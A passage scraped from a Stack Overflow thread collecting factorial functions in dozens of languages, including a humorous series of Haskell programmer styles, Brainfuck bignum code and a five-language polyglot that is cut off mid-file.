&lt;/n&gt;
</code></pre>

<p>The XSLT file, <strong>factorial.xsl</strong>:</p>

<pre><code>&lt;?xml version=""1.0""?&gt;
&lt;xsl:stylesheet version=""1.0""                     
                xmlns:xsl=""http://www.w3.org/1999/XSL/Transform""
                xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" &gt;
  &lt;xsl:output method=""text""/&gt;
  &lt;!-- 0! = 1 --&gt;
  &lt;xsl:template match=""text()[. = 0]""&gt;
    1
  &lt;/xsl:template&gt;
  &lt;!-- n! = (n-1)! * n--&gt;
  &lt;xsl:template match=""text()[. &gt; 0]""&gt;
    &lt;xsl:variable name=""x""&gt;
      &lt;xsl:apply-templates select=""msxsl:node-set( . - 1 )/text()""/&gt;
    &lt;/xsl:variable&gt;
    &lt;xsl:value-of select=""$x * .""/&gt;
  &lt;/xsl:template&gt;
  &lt;!-- Calculate n! --&gt;
  &lt;xsl:template match=""/n""&gt;
    &lt;xsl:apply-templates select=""text()""/&gt;
  &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre>

<p>Save both files in the same directory and open <strong>factorial.xml</strong> in IE.</p>
 <h1>J</h1>

<pre><code>   fact=. verb define
*/ &gt;:@i. y
)
</code></pre>
 <p>Iswim/Lucid:</p>

<p><code>factorial = 1 fby factorial * (time+1);</code></p>
 <p><strong>Python, one liner:</strong></p>

<p>A bit more clean than the other python answer.
This, and the previous answer, will fail if the input is less than 1.</p>

<p>def fact(n): return reduce(int.<strong>mul</strong>,xrange(2,n))</p>
 <h1>Clojure</h1>

<h2>Tail-recursive</h2>

<pre><code>(defn fact 
  ([n] (fact n 1))
  ([n acc] (if (= n 0) 
               acc 
               (recur (- n 1) (* acc n)))))
</code></pre>

<h2>Short and simple</h2>

<pre><code> (defn fact [n] (apply * (range 1 (+ n 1))))
</code></pre>
 <h1>Common Lisp</h1>

<ul>
<li>Call it by name: <code>!</code></li>
<li>Tail recursive</li>
<li>Common Lisp handles arbitrarily large numbers</li>
</ul>

<pre>
(defun ! (n)
  ""factorial""
  (labels ((fac (n prod)
             (if (zerop n)
                 prod
                 (fac (- n 1) (* prod n)))))
    (fac n 1)))
</pre>

<p><em>edit</em>:  or with accumulator as optional parameter:</p>

<pre>
(defun ! (n &optional prod)
  ""factorial""
  (if (zerop n)
      prod
      (! (- n 1) (* prod n))))
</pre>

<p>or as a reduce, at the cost of a bigger memory footprint and more consing:</p>

<pre>
(defun range (start end &optional acc)
  ""range from start inclusive to end exclusive, start = start end)
      (nreverse acc)
      (range (+ start 1) end (cons start acc))))

(defun ! (n)
  ""factorial""
  (reduce #'* (range 1 (+ n 1))))
</pre>
 <h1>Factor</h1>

<p>USE: math.ranges</p>

<p>: factorial ( n -- n! ) 1 [a,b] product ;</p>
 <h1>Scala</h1>

<p>The factorial can be defined functionally as:</p>

<pre><code>def fact(n: Int): BigInt = 1 to n reduceLeft(_*_)
</code></pre>

<p>or more traditionally as</p>

<pre><code>def fact(n: Int): BigInt = if (n == 0) 1 else fact(n-1) * n
</code></pre>

<p>and we can make ! a valid method on Ints:</p>

<pre><code>object extendBuiltins extends Application {

  class Factorizer(n: Int) {
    def ! = 1 to n reduceLeft(_*_)
  }

  implicit def int2fact(n: Int) = new Factorizer(n)

  println(""10! = "" + (10!))
}
</code></pre>
 <p>Compile time in C++</p>

<pre><code>template&lt;unsigned i&gt;
struct factorial
{ static const unsigned value = i * factorial&lt;i-1&gt;::value; };

template&lt;&gt;
struct factorial&lt;0&gt;
{ static const unsigned value = 1; };
</code></pre>

<p>Use in code as:</p>

<pre><code>Factorial&lt;5&gt;::value
</code></pre>
 <h1>Haskell</h1>

<pre><code>factorial n = product [1..n]
</code></pre>
 <p>Freshman Haskell programmer</p>

<pre><code>fac n = if n == 0 
           then 1
           else n * fac (n-1)
</code></pre>

<p>Sophomore Haskell programmer, at MIT
(studied Scheme as a freshman)</p>

<pre><code>fac = (\(n) -&gt;
        (if ((==) n 0)
            then 1
            else ((*) n (fac ((-) n 1)))))
</code></pre>

<p>Junior Haskell programmer
(beginning Peano player)</p>

<pre><code>fac  0    =  1
fac (n+1) = (n+1) * fac n
</code></pre>

<p>Another junior Haskell programmer
(read that n+k patterns are “a disgusting part of Haskell” [1]
and joined the “Ban n+k patterns”-movement [2])</p>

<pre><code>fac 0 = 1
fac n = n * fac (n-1)
</code></pre>

<p>Senior Haskell programmer
(voted for   Nixon   Buchanan   Bush — “leans right”)</p>

<pre><code>fac n = foldr (*) 1 [1..n]
</code></pre>

<p>Another senior Haskell programmer
(voted for   McGovern   Biafra   Nader — “leans left”)</p>

<pre><code>fac n = foldl (*) 1 [1..n]
</code></pre>

<p>Yet another senior Haskell programmer
(leaned so far right he came back left again!)</p>

<pre><code>-- using foldr to simulate foldl

fac n = foldr (\x g n -&gt; g (x*n)) id [1..n] 1
</code></pre>

<p>Memoizing Haskell programmer
(takes Ginkgo Biloba daily)</p>

<pre><code>facs = scanl (*) 1 [1..]

fac n = facs !! n
</code></pre>

<p>Pointless (ahem) “Points-free” Haskell programmer
(studied at Oxford)</p>

<pre><code>fac = foldr (*) 1 . enumFromTo 1
</code></pre>

<p>Iterative Haskell programmer
(former Pascal programmer)</p>

<pre><code>fac n = result (for init next done)
        where init = (0,1)
              next   (i,m) = (i+1, m * (i+1))
              done   (i,_) = i==n
              result (_,m) = m

for i n d = until d n i
</code></pre>

<p>Iterative one-liner Haskell programmer
(former APL and C programmer)</p>

<pre><code>fac n = snd (until ((&gt;n) . fst) (\(i,m) -&gt; (i+1, i*m)) (1,1))
</code></pre>

<p>Accumulating Haskell programmer
(building up to a quick climax)</p>

<pre><code>facAcc a 0 = a
facAcc a n = facAcc (n*a) (n-1)

fac = facAcc 1
</code></pre>

<p>Continuation-passing Haskell programmer
(raised RABBITS in early years, then moved to New Jersey)</p>

<pre><code>facCps k 0 = k 1
facCps k n = facCps (k . (n *)) (n-1)

fac = facCps id
</code></pre>

<p>Boy Scout Haskell programmer
(likes tying knots; always “reverent,” he
belongs to the Church of the Least Fixed-Point [8])</p>

<pre><code>y f = f (y f)

fac = y (\f n -&gt; if (n==0) then 1 else n * f (n-1))
</code></pre>

<p>Combinatory Haskell programmer
(eschews variables, if not obfuscation;
all this currying’s just a phase, though it seldom hinders)</p>

<pre><code>s f g x = f x (g x)

k x y   = x

b f g x = f (g x)

c f g x = f x g

y f     = f (y f)

cond p f g x = if p x then f x else g x

fac  = y (b (cond ((==) 0) (k 1)) (b (s (*)) (c b pred)))
</code></pre>

<p>List-encoding Haskell programmer
(prefers to count in unary)</p>

<pre><code>arb = ()    -- ""undefined"" is also a good RHS, as is ""arb"" :)

listenc n = replicate n arb
listprj f = length . f . listenc

listprod xs ys = [ i (x,y) | x&lt;-xs, y&lt;-ys ]
                 where i _ = arb

facl []         = listenc  1
facl n@(_:pred) = listprod n (facl pred)

fac = listprj facl
</code></pre>

<p>Interpretive Haskell programmer
(never “met a language” he didn't like)</p>

<pre><code>-- a dynamically-typed term language

data Term = Occ Var
          | Use Prim
          | Lit Integer
          | App Term Term
          | Abs Var  Term
          | Rec Var  Term

type Var  = String
type Prim = String


-- a domain of values, including functions

data Value = Num  Integer
           | Bool Bool
           | Fun (Value -&gt; Value)

instance Show Value where
  show (Num  n) = show n
  show (Bool b) = show b
  show (Fun  _) = """"

prjFun (Fun f) = f
prjFun  _      = error ""bad function value""

prjNum (Num n) = n
prjNum  _      = error ""bad numeric value""

prjBool (Bool b) = b
prjBool  _       = error ""bad boolean value""

binOp inj f = Fun (\i -&gt; (Fun (\j -&gt; inj (f (prjNum i) (prjNum j)))))


-- environments mapping variables to values

type Env = [(Var, Value)]

getval x env =  case lookup x env of
                  Just v  -&gt; v
                  Nothing -&gt; error (""no value for "" ++ x)


-- an environment-based evaluation function

eval env (Occ x) = getval x env
eval env (Use c) = getval c prims
eval env (Lit k) = Num k
eval env (App m n) = prjFun (eval env m) (eval env n)
eval env (Abs x m) = Fun  (\v -&gt; eval ((x,v) : env) m)
eval env (Rec x m) = f where f = eval ((x,f) : env) m


-- a (fixed) ""environment"" of language primitives

times = binOp Num  (*)

minus = binOp Num  (-)
equal = binOp Bool (==)
cond  = Fun (\b -&gt; Fun (\x -&gt; Fun (\y -&gt; if (prjBool b) then x else y)))

prims = [ (""*"", times), (""-"", minus), (""=="", equal), (""if"", cond) ]


-- a term representing factorial and a ""wrapper"" for evaluation

facTerm = Rec ""f"" (Abs ""n"" 
              (App (App (App (Use ""if"")
                   (App (App (Use ""=="") (Occ ""n"")) (Lit 0))) (Lit 1))
                   (App (App (Use ""*"")  (Occ ""n""))
                        (App (Occ ""f"")  
                             (App (App (Use ""-"") (Occ ""n"")) (Lit 1))))))

fac n = prjNum (eval [] (App facTerm (Lit n)))
</code></pre>

<p>Static Haskell programmer
(he does it with class, he’s got that fundep Jones!
After Thomas Hallgren’s “Fun with Functional Dependencies” [7])</p>

<pre><code>-- static Peano constructors and numerals

data Zero
data Succ n

type One   = Succ Zero
type Two   = Succ One
type Three = Succ Two
type Four  = Succ Three


-- dynamic representatives for static Peanos

zero  = undefined :: Zero
one   = undefined :: One
two   = undefined :: Two
three = undefined :: Three
four  = undefined :: Four


-- addition, a la Prolog

class Add a b c | a b -&gt; c where
  add :: a -&gt; b -&gt; c

instance              Add  Zero    b  b
instance Add a b c =&gt; Add (Succ a) b (Succ c)


-- multiplication, a la Prolog

class Mul a b c | a b -&gt; c where
  mul :: a -&gt; b -&gt; c

instance                           Mul  Zero    b Zero
instance (Mul a b c, Add b c d) =&gt; Mul (Succ a) b d


-- factorial, a la Prolog

class Fac a b | a -&gt; b where
  fac :: a -&gt; b

instance                                Fac  Zero    One
instance (Fac n k, Mul (Succ n) k m) =&gt; Fac (Succ n) m

-- try, for ""instance"" (sorry):
-- 
--     :t fac four
</code></pre>

<p>Beginning graduate Haskell programmer
(graduate education tends to liberate one from petty concerns
about, e.g., the efficiency of hardware-based integers)</p>

<pre><code>-- the natural numbers, a la Peano

data Nat = Zero | Succ Nat


-- iteration and some applications

iter z s  Zero    = z
iter z s (Succ n) = s (iter z s n)

plus n = iter n     Succ
mult n = iter Zero (plus n)


-- primitive recursion

primrec z s  Zero    = z
primrec z s (Succ n) = s n (primrec z s n)


-- two versions of factorial

fac  = snd . iter (one, one) (\(a,b) -&gt; (Succ a, mult a b))
fac' = primrec one (mult . Succ)


-- for convenience and testing (try e.g. ""fac five"")

int = iter 0 (1+)

instance Show Nat where
  show = show . int

(zero : one : two : three : four : five : _) = iterate Succ Zero
</code></pre>

<p>Origamist Haskell programmer
(always starts out with the “basic Bird fold”)</p>

<pre><code>-- (curried, list) fold and an application

fold c n []     = n
fold c n (x:xs) = c x (fold c n xs)

prod = fold (*) 1


-- (curried, boolean-based, list) unfold and an application

unfold p f g x = 
  if p x 
     then [] 
     else f x : unfold p f g (g x)

downfrom = unfold (==0) id pred


-- hylomorphisms, as-is or ""unfolded"" (ouch! sorry ...)

refold  c n p f g   = fold c n . unfold p f g

refold' c n p f g x = 
  if p x 
     then n 
     else c (f x) (refold' c n p f g (g x))


-- several versions of factorial, all (extensionally) equivalent

fac   = prod . downfrom
fac'  = refold  (*) 1 (==0) id pred
fac'' = refold' (*) 1 (==0) id pred
</code></pre>

<p>Cartesianally-inclined Haskell programmer
(prefers Greek food, avoids the spicy Indian stuff;
inspired by Lex Augusteijn’s “Sorting Morphisms” [3])</p>

<pre><code>-- (product-based, list) catamorphisms and an application

cata (n,c) []     = n
cata (n,c) (x:xs) = c (x, cata (n,c) xs)

mult = uncurry (*)
prod = cata (1, mult)


-- (co-product-based, list) anamorphisms and an application

ana f = either (const []) (cons . pair (id, ana f)) . f

cons = uncurry (:)

downfrom = ana uncount

uncount 0 = Left  ()
uncount n = Right (n, n-1)


-- two variations on list hylomorphisms

hylo  f  g    = cata g . ana f

hylo' f (n,c) = either (const n) (c . pair (id, hylo' f (c,n))) . f

pair (f,g) (x,y) = (f x, g y)


-- several versions of factorial, all (extensionally) equivalent

fac   = prod . downfrom
fac'  = hylo  uncount (1, mult)
fac'' = hylo' uncount (1, mult)
</code></pre>

<p>Ph.D. Haskell programmer
(ate so many bananas that his eyes bugged out, now he needs new lenses!)</p>

<pre><code>-- explicit type recursion based on functors

newtype Mu f = Mu (f (Mu f))  deriving Show

in      x  = Mu x
out (Mu x) = x


-- cata- and ana-morphisms, now for *arbitrary* (regular) base functors

cata phi = phi . fmap (cata phi) . out
ana  psi = in  . fmap (ana  psi) . psi


-- base functor and data type for natural numbers,
-- using a curried elimination operator

data N b = Zero | Succ b  deriving Show

instance Functor N where
  fmap f = nelim Zero (Succ . f)

nelim z s  Zero    = z
nelim z s (Succ n) = s n

type Nat = Mu N


-- conversion to internal numbers, conveniences and applications

int = cata (nelim 0 (1+))

instance Show Nat where
  show = show . int

zero = in   Zero
suck = in . Succ       -- pardon my ""French"" (Prelude conflict)

plus n = cata (nelim n     suck   )
mult n = cata (nelim zero (plus n))


-- base functor and data type for lists

data L a b = Nil | Cons a b  deriving Show

instance Functor (L a) where
  fmap f = lelim Nil (\a b -&gt; Cons a (f b))

lelim n c  Nil       = n
lelim n c (Cons a b) = c a b

type List a = Mu (L a)


-- conversion to internal lists, conveniences and applications

list = cata (lelim [] (:))

instance Show a =&gt; Show (List a) where
  show = show . list

prod = cata (lelim (suck zero) mult)

upto = ana (nelim Nil (diag (Cons . suck)) . out)

diag f x = f x x

fac = prod . upto
</code></pre>

<p>Post-doc Haskell programmer
(from Uustalu, Vene and Pardo’s “Recursion Schemes from Comonads” [4])</p>

<pre><code>-- explicit type recursion with functors and catamorphisms

newtype Mu f = In (f (Mu f))

unIn (In x) = x

cata phi = phi . fmap (cata phi) . unIn


-- base functor and data type for natural numbers,
-- using locally-defined ""eliminators""

data N c = Z | S c

instance Functor N where
  fmap g  Z    = Z
  fmap g (S x) = S (g x)

type Nat = Mu N

zero   = In  Z
suck n = In (S n)

add m = cata phi where
  phi  Z    = m
  phi (S f) = suck f

mult m = cata phi where
  phi  Z    = zero
  phi (S f) = add m f


-- explicit products and their functorial action

data Prod e c = Pair c e

outl (Pair x y) = x
outr (Pair x y) = y

fork f g x = Pair (f x) (g x)

instance Functor (Prod e) where
  fmap g = fork (g . outl) outr


-- comonads, the categorical ""opposite"" of monads

class Functor n =&gt; Comonad n where
  extr :: n a -&gt; a
  dupl :: n a -&gt; n (n a)

instance Comonad (Prod e) where
  extr = outl
  dupl = fork id outr


-- generalized catamorphisms, zygomorphisms and paramorphisms

gcata :: (Functor f, Comonad n) =&gt;
           (forall a. f (n a) -&gt; n (f a))
             -&gt; (f (n c) -&gt; c) -&gt; Mu f -&gt; c

gcata dist phi = extr . cata (fmap phi . dist . fmap dupl)

zygo chi = gcata (fork (fmap outl) (chi . fmap outr))

para :: Functor f =&gt; (f (Prod (Mu f) c) -&gt; c) -&gt; Mu f -&gt; c
para = zygo In


-- factorial, the *hard* way!

fac = para phi where
  phi  Z             = suck zero
  phi (S (Pair f n)) = mult f (suck n)


-- for convenience and testing

int = cata phi where
  phi  Z    = 0
  phi (S f) = 1 + f

instance Show (Mu N) where
  show = show . int
</code></pre>

<p>Tenured professor
(teaching Haskell to freshmen)</p>

<pre><code>fac n = product [1..n]
</code></pre>
 <h2>Smalltalk, using a closure</h2>

<pre><code>    fac := [ :x | x = 0 ifTrue: [ 1 ] ifFalse: [ x * (fac value: x -1) ]].

    Transcript show: (fac value: 24) ""-&gt; 620448401733239439360000""
</code></pre>

<p>NB does not work in Squeak, requires full closures.</p>
 <h2>Smalltalk, memoized</h2>

<p>Define a method on Dictionary</p>

<pre><code>Dictionary &gt;&gt; fac: x
    ^self at: x ifAbsentPut: [ x * (self fac: x - 1) ]
</code></pre>

<p>usage</p>

<pre><code> d := Dictionary new.
 d at: 0 put: 1.
 d fac: 24
</code></pre>
 <h2>Smalltalk, 1-Liner</h2>

<pre><code>(1 to: 24) inject: 1 into: [ :a :b | a * b ]
</code></pre>
 <p>Java Script: Creative method using ""interview question"" counting bits fnc.</p>

<pre><code>function nu(x)
{
  var r=0
  while( x ) {
    x &amp;= x-1
    r++
  }
  return r
}

function fac(n)
{
  var r= Math.pow(2,n-nu(n))

  for ( var i=3 ; i &lt;= n ; i+= 2 )
    r *= Math.pow(i,Math.floor(Math.log(n/i)/Math.LN2)+1)
  return r
}
</code></pre>

<p>Works up to 21! then Chrome switches to scientific notation.  Inspiration thanks lack of sleep and Knuth, et al's ""concrete mathematics"".</p>
 <p>Nothing is as fast as <strong>bash</strong> &amp; <strong>bc</strong>:</p>

<pre><code>function fac { seq $1 | paste -sd* | bc; }  
$ fac 42
1405006117752879898543142606244511569936384000000000
$
</code></pre>
 <p>In MUMPS:</p>

<pre><code>fact(N)
  N F,I S F=1 F  I=2:1:N S F=F*I
  QUIT F
</code></pre>

<p>Or, if you're a fan of indirection:</p>

<pre><code>fact(N)
  N F,I S F=1 F I=2:1:N S F=F_""*""_I
  QUIT @F
</code></pre>
 <h1>Mathematica: non-recursive</h1>

<pre><code>fact[n_] := Times @@ Range[n]
</code></pre>

<p>Which is syntactic sugar for <code>Apply[Times, Range[n]]</code>.  I think that's the best way to do it, not counting the built-in <code>n!</code>, of course.  Note that that automatically uses bignums.</p>
 <p>Common Lisp version:</p>

<pre><code>(defun ! (n) (reduce #'* (loop for i from 2 below (+ n 1) collect i)))
</code></pre>

<p>Seems to be quite fast.</p>

<pre><code>* (! 42)

1405006117752879898543142606244511569936384000000000
</code></pre>
 <p>Common Lisp, since noone has commited that yet:</p>

<pre><code>(defun factorial (n)
  (if (&lt;= n 1)
      1 
      (* n (factorial (1- n)))))
</code></pre>
 <h1>Brainfuck: with bignum support!</h1>

<p>Accepts as input a non-negative integer followed by newline, and outputs the corresponding factorial followed by newline.</p>

<pre><code>&gt;&gt;&gt;&gt;,----------[&gt;&gt;&gt;&gt;,----------]&gt;&gt;&gt;&gt;++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;++++++[&lt;----
--&gt;-]&lt;-&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]&lt;-&gt;+&lt;[&gt;&gt;&gt;&gt;+&lt;&lt;&lt;-&lt;[-]]&gt;[-]
&gt;&gt;]&gt;[-&lt;&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]&gt;&gt;]&gt;&gt;&gt;&gt;[-[&gt;+&lt;-]+&gt;&gt;&gt;
&gt;]&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;]&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;[&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&gt;&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[[&gt;&gt;&gt;&gt;+&lt;&lt;
&lt;&lt;-]&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;-[&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&gt;&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[&gt;&gt;&gt;
+&lt;&lt;&lt;-]&gt;&gt;&gt;[&lt;&lt;&lt;+&gt;&gt;+&gt;-]&lt;-[&gt;&gt;+&lt;&lt;[-]]&lt;&lt;[&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[&gt;[&gt;+&lt;-]&gt;[&lt;&lt;+&gt;+&gt;
-]&lt;&lt;[&gt;&gt;&gt;+&lt;&lt;&lt;-]&gt;&gt;&gt;[&lt;&lt;&lt;+&gt;&gt;+&gt;-]&lt;-&gt;+++++++++[-&lt;[-[&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;-]]&gt;&gt;
&gt;&gt;[&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;]&lt;[&gt;&gt;+&lt;&lt;&lt;&lt;[-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]]&gt;&gt;]&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;]&lt;&lt;&lt;[&lt;&lt;
&lt;&lt;]&gt;&gt;&gt;&gt;-]&gt;&gt;&gt;&gt;]&gt;&gt;&gt;[&gt;[-]&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]&lt;-&gt;+&lt;[&gt;-&lt;[-
]]&gt;[-&lt;&lt;-&lt;&lt;&lt;&lt;[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]&lt;-&gt;+&lt;[&gt;-&lt;[-]]&gt;]&lt;&lt;[&lt;&lt;&lt;&lt;]&lt;&lt;&lt;&lt;-[
&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]+&lt;[&gt;-&lt;[-]]&gt;[-&lt;&lt;++++++++++&lt;&lt;&lt;&lt;-[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;
&lt;+&gt;+&gt;-]+&lt;[&gt;-&lt;[-]]&gt;]&lt;&lt;[&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]&lt;-&gt;+&lt;[&gt;&gt;&gt;
&gt;+&lt;&lt;&lt;-&lt;[-]]&gt;[-]&gt;&gt;]&gt;]&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[&gt;+++++++[&lt;+++++++&gt;-]&lt;--.&lt;&lt;
&lt;&lt;]++++++++++.
</code></pre>

<p>Unlike the brainf*ck answer posted earlier, this <em>does not</em> overflow any memory locations.  (That implementation put n! in a single memory location, effectively limiting it to n less than 6 under standard bf rules.)  This program will output n! for any value of n, limited only by time and memory (or bf implementation).  For example, using Urban Muller's compiler on my machine, it takes 12 seconds to compute 1000!  I think that's pretty good, considering the program can only move left/right and increment/decrement by one.</p>

<p>Believe it or not, this is the first bf program I've written; it took about 10 hours, which were mostly spent debugging.  Unfortunately, I later found out that Daniel B Cristofani has written a <a href=""http://www.hevanet.com/cristofd/brainfuck/factorial.b"" rel=""nofollow"">factorial generator</a>, which just outputs ever-larger factorials, never terminating:</p>

<pre><code>&gt;++++++++++&gt;&gt;&gt;+&gt;+[&gt;&gt;&gt;+[-[&lt;&lt;&lt;&lt;&lt;[+&lt;&lt;&lt;&lt;&lt;]&gt;&gt;[[-]&gt;[&lt;&lt;+&gt;+&gt;-]&lt;[&gt;+&lt;-
]&lt;[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;+&lt;-[&gt;[-]&gt;&gt;&gt;&gt;+&gt;+&lt;
&lt;&lt;&lt;&lt;&lt;-[&gt;+&lt;-]]]]]]]]]]]&gt;[&lt;+&gt;-]+&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&gt;&gt;&gt;&gt;
&gt;]++[-&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;-]+&gt;&gt;&gt;&gt;&gt;]&lt;[&gt;++&lt;-]&lt;&lt;&lt;&lt;[&lt;[&gt;+&lt;-]&lt;&lt;&lt;&lt;]&gt;&gt;[-&gt;[-]
++++++[&lt;++++++++&gt;-]&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;[&lt;[&gt;+&gt;+&lt;&lt;-]&gt;.&lt;&lt;&lt;&lt;&lt;]&gt;.&gt;&gt;&gt;&gt;]
</code></pre>

<p>His program is much shorter, but he's practically a professional bf golfer.</p>
 <h1>Polyglot: 5 languages, all using bignums</h1>

<p>So, I wrote a polyglot which works in the three languages I often write in, as well as one from my other answer to this question and one I just learned today.  It's a standalone program, which reads a single line containing a nonnegative integer and prints a single line containing its factorial.  Bignums are used in all languages, so the maximum computable factorial depends only on your computer's resources.</p>

<ul>
<li><b>Perl</b>: uses built-in bignum package.  Run with <code>perl FILENAME</code>.</li>
<li><b>Haskell</b>: uses built-in bignums.  Run with <code>runhugs FILENAME</code> or your favorite compiler's equivalent.</li>
<li><b>C++</b>: requires GMP for bignum support.  To compile with g++, use <code>g++ -lgmpxx -lgmp -x c++ FILENAME</code> to link against the right libraries.  After compiling, run <code>./a.out</code>.  Or use your favorite compiler's equivalent.</li>
<li><b>brainf*ck</b>: I wrote some bignum support in <a href=""http://stackoverflow.com/questions/23930/factorial-algorithms-in-different-languages/432010#432010"">this post</a>.  Using <a href=""http://aminet.net/package.php?package=dev/lang/brainfuck-2.lha"" rel=""nofollow"">Muller's classic distribution</a>, compile with <code>bf &lt; FILENAME &gt; EXECUTABLE</code>.  Make the output executable and run it.  Or use your favorite distribution.</li>
<li><b>Whitespace</b>: uses built-in bignum support.  Run with <code>wspace FILENAME</code>.</li>
</ul>

<p><i>Edit:</i> added Whitespace as a fifth language.  Incidentally, do <em>not</em> wrap the code with <code>&lt;code&gt;</code> tags; it breaks the Whitespace.  Also, the code looks much nicer in fixed-width.</p>

<pre>char&#32;//#&#32;b=0+0{-&#32;|0*/;&#32;#&gt;&gt;&gt;&gt;,----------[&gt;&gt;&gt;&gt;,--------
#define&#09;a/*#--]&gt;&gt;&gt;&gt;++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;++++++[&lt;------&gt;-]&lt;-&lt;&lt;&lt;
#Perl&#09;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&#09;&#32;&lt;&gt;&#32;&lt;&gt;&#32;&lt;&lt;]&gt;&gt;&gt;&gt;[[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]&lt;-&gt;
#C++&#09;--&gt;&lt;&gt;&lt;&gt;&#09;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&#09;&gt;&#32;&lt;&#32;&gt;&#32;&lt;&#09;+&lt;[&gt;&gt;&gt;&gt;+&lt;&lt;&lt;-&lt;[-]]&gt;[-]
#Haskell&#32;&gt;&gt;]&gt;[-&lt;&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]&gt;&gt;]
#Whitespace&#09;&gt;&gt;&gt;&gt;[-[&gt;+&lt;-]+&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;]&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;
#brainf*ck&#32;&gt;&#32;&lt;&#32;]&gt;&gt;&gt;&gt;&gt;[&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&gt;&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[[&gt;&gt;&gt;&gt;*/
exp;&#32;;//;#+&lt;&lt;&lt;&lt;-]&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&lt;&lt;&lt;&lt;][.POLYGLOT^5.
#include&#32;&lt;gmpxx.h&gt;//]&gt;&gt;&gt;&gt;-[&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&gt;&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[&gt;&gt;
#define&#09;eval&#32;int&#09;main()//&gt;+&lt;&lt;&lt;-]&gt;&gt;&gt;[&lt;&lt;&lt;+&gt;&gt;+&gt;-&gt;
#include&#32;&lt;iostream&gt;//&lt;]&lt;-[&gt;&gt;+&lt;&lt;[-]]&lt;&lt;[&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[&gt;[&gt;&gt;&gt;
#define&#09;print&#32;std::cout&#09;&lt;&lt;&#32;//&#32;&gt;&#09;&lt;+&lt;-]&gt;[&lt;&lt;+&gt;+&gt;-]&lt;&lt;[&gt;&gt;&gt;
#define&#09;z&#32;std::cin&gt;&gt;//&lt;&lt;&#32;+&lt;&lt;&lt;-]&gt;&gt;&gt;[&lt;&lt;&lt;+&gt;&gt;+&gt;-]&lt;-&gt;+++++
#define&#32;c/*++++[-&lt;[-[&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;-]]&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;*/
#define&#09;abs&#32;int&#32;$n&#32;//&gt;&lt;&#09;&lt;]&lt;[&gt;&gt;+&lt;&lt;&lt;&lt;[-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]]&gt;&gt;]&lt;
#define&#09;uc&#32;mpz_class&#32;fact(int&#09;$n){/*&lt;&lt;&lt;[&lt;&lt;&lt;&lt;]&lt;&lt;&lt;[&lt;&lt;
use&#32;bignum;sub#&lt;&lt;]&gt;&gt;&gt;&gt;-]&gt;&gt;&gt;&gt;]&gt;&gt;&gt;[&gt;[-]&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[&gt;&gt;+&lt;&lt;-]
z{$_[0+0]=readline(*STDIN);}sub&#32;fact{my($n)=shift;#&gt;&gt;
